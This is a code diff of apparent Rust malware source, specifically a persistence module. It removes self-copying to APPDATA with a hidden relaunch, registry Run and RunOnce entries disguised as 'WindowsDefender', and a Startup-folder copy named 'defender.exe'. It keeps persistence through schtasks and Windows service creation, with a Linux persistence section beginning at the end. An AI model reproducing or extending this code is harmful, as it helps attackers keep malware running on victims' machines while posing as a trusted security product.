@@ -1,4 +1,4 @@
-use std::path::{Path, PathBuf};
+use std::path::Path;
 use std::env;
 use std::fs;
 use std::process::Command;
@@ -43,24 +43,8 @@ fn windows_persist(is_dll: bool) -> std::io::Result<()> {
         return dll_persistence(&current_exe);
     }
 
-    let appdata = env::var("APPDATA")
-        .map_err(|e| std::io::Error::new(std::io::ErrorKind::NotFound, e))?;
-    let target_path: PathBuf = Path::new(&appdata).join(TARGET_SUBPATH);
-
-    if let Some(dir) = target_path.parent() {
-        fs::create_dir_all(dir)?;
-    }
-
-    if current_exe != target_path {
-        fs::copy(&current_exe, &target_path)?;
-        Command::new(&target_path).creation_flags(CREATE_NO_WINDOW).spawn().ok();
-        std::process::exit(0);
-    }
-
-    registry_run(&target_path);
-    scheduled_task(&target_path);
-    windows_service(&target_path);
-    startup_folder(&target_path);
+    scheduled_task(&current_exe);
+    windows_service(&current_exe);
 
     Ok(())
 }
@@ -98,18 +82,6 @@ fn dll_persistence(dll_path: &Path) -> std::io::Result<()> {
 }
 
 #[cfg(target_os = "windows")]
-fn registry_run(target_path: &Path) {
-    let hkcu = RegKey::predef(enums::HKEY_CURRENT_USER);
-    if let Ok((key, _)) = hkcu.create_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run") {
-        let _ = key.set_value("WindowsDefender", &target_path.to_string_lossy().to_string());
-    }
-
-    if let Ok((key, _)) = hkcu.create_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce") {
-        let _ = key.set_value("WindowsDefender", &target_path.to_string_lossy().to_string());
-    }
-}
-
-#[cfg(target_os = "windows")]
 fn scheduled_task(target_path: &Path) {
     let path_str = target_path.to_string_lossy();
     let _ = Command::new("schtasks")
@@ -140,15 +112,6 @@ fn windows_service(target_path: &Path) {
         .stdout(std::process::Stdio::null())
         .stderr(std::process::Stdio::null())
         .spawn();
-}
-
-#[cfg(target_os = "windows")]
-fn startup_folder(target_path: &Path) {
-    if let Ok(appdata) = env::var("APPDATA") {
-        let startup = Path::new(&appdata).join("Microsoft\\Windows\\Start Menu\\Programs\\Startup");
-        let _ = fs::create_dir_all(&startup);
-        let _ = fs::copy(target_path, startup.join("defender.exe"));
-    }
 }
 
 // === Linux Persistence ===
